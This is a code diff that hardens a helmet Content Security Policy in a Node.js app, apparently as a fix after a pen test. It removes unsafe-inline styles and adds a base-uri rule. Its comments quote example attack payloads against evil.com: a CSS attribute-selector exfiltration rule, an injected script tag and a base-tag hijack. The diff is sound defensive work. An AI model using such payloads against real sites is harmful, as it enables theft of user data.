@@ -20,18 +20,30 @@ const helmetConfig = helmet({
   frameguard: {
     action: 'deny'
   },
-  // Content Security Policy
+  // Content Security Policy — hardened (Phase 8 pen test fix)
+  //
+  // VULNERABLE config (do NOT use):
+  //   styleSrc: ["'self'", "'unsafe-inline'"]
+  //   ↑ allows <style> injection and style= attributes; attacker can exfiltrate data via CSS
+  //   e.g.  input[value^="a"] { background: url(https://evil.com/?c=a) }
+  //
+  // HOW THE HARDENED CSP BLOCKS XSS:
+  //   An injected <script>alert(1)</script> is blocked because scriptSrc is 'self' only.
+  //   A data: URI script is blocked because it is not listed.
+  //   Inline event handlers (onclick=...) are blocked — no 'unsafe-inline' anywhere.
+  //   base-uri 'self' prevents <base href="https://evil.com"> hijacking relative URLs.
   contentSecurityPolicy: {
     directives: {
       defaultSrc: ["'self'"],
-      scriptSrc: ["'self'"],
-      styleSrc: ["'self'", "'unsafe-inline'"],
+      scriptSrc: ["'self'"],           // no unsafe-inline, no unsafe-eval
+      styleSrc: ["'self'"],            // no unsafe-inline
       imgSrc: ["'self'", "data:", "https:"],
       connectSrc: ["'self'"],
       fontSrc: ["'self'", "https:", "data:"],
-      objectSrc: ["'none'"],
+      objectSrc: ["'none'"],           // block Flash and plugins entirely
       mediaSrc: ["'self'"],
       frameSrc: ["'none'"],
+      baseUri: ["'self'"],             // SECURITY: prevents <base> tag hijacking
     },
   },
 });
